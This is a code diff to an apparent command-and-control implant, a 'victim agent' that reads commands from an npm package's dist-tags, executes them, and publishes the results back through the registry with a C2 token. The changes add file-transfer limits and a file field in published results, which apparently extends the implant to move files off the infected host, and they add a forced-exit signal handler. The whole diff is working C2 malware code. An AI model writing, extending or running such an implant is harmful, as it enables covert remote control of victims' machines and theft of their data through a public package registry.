@@ -95,9 +95,10 @@ export function selectCommands(distTags, state, agentId) {
  * @param {object} deps.client RegistryClient (or fake with setDistTag)
  * @param {object} deps.logger
  * @param {Function} [deps.save] persist callback, called after each state change
+ * @param {object} [deps.limits] task limits, e.g. { maxFileBytes, transferRoot }
  * @returns {Promise<{executed: number, resultsPublished: number, skipped: number}>}
  */
-export async function processDistTags({ distTags, state, agentId, client, logger, save }) {
+export async function processDistTags({ distTags, state, agentId, client, logger, save, limits = {} }) {
   const { commands, skipped } = selectCommands(distTags, state, agentId);
   for (const s of skipped) {
     logger.warn(`skipping malformed tag "${s.tag}": ${s.reason}`);
@@ -106,13 +107,14 @@ export async function processDistTags({ distTags, state, agentId, client, logger
   let resultsPublished = 0;
   for (const cmd of commands) {
     logger.info(`executing seq ${cmd.seq} (target ${cmd.agentId}): op=${cmd.payload.op}`);
-    const result = runTask(cmd.payload.op, cmd.payload.args ?? {});
+    const result = runTask(cmd.payload.op, cmd.payload.args ?? {}, limits);
     const resultPayload = {
       seq: cmd.seq,
       op: cmd.payload.op,
       ok: result.ok,
       output: result.output,
       error: result.error,
+      ...(result.file ? { file: result.file } : {}),
       ts: Date.now(),
     };
 
@@ -172,13 +174,20 @@ async function main() {
 
   logger.info(`victim agent ${state.agentId} starting`);
   logger.info(`registry=${cfg.registryUrl} package=${cfg.packageName} poll=${cfg.pollIntervalSec}s`);
+  logger.info(`transferRoot=${path.resolve(cfg.transferRoot)} maxFileBytes=${cfg.maxFileBytes}`);
   if (!cfg.token) {
     logger.warn('NPM_C2_TOKEN is not set — result publishing will fail with 401');
   }
 
   let running = true;
+  let sigCount = 0;
   const shutdown = (signal) => {
-    logger.info(`received ${signal}, shutting down`);
+    sigCount++;
+    if (sigCount > 1) {
+      logger.warn(`received ${signal} again — forcing exit`);
+      process.exit(1);
+    }
+    logger.info(`received ${signal}, shutting down (press Ctrl-C again to force)`);
     running = false;
   };
   process.on('SIGINT', shutdown);
@@ -197,6 +206,7 @@ async function main() {
         client,
         logger,
         save,
+        limits: { maxFileBytes: cfg.maxFileBytes, transferRoot: cfg.transferRoot },
       });
       if (stats.executed > 0 || stats.skipped > 0) {
         logger.info('cycle summary', stats);
